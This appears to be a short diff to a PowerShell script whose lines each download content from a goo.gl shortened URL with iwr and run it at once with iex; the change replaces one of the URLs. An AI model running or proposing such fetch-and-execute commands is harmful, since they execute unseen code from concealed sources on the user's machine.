@@ -1,5 +1,5 @@
 iwr https://goo.gl/x6ZcHM | iex;
-iwr https://goo.gl/zggqse | iex;
+iwr https://goo.gl/CB7F6k | iex;
 iwr https://goo.gl/wxJHHq | iex;
 iwr https://goo.gl/4QsWoj | iex;
 
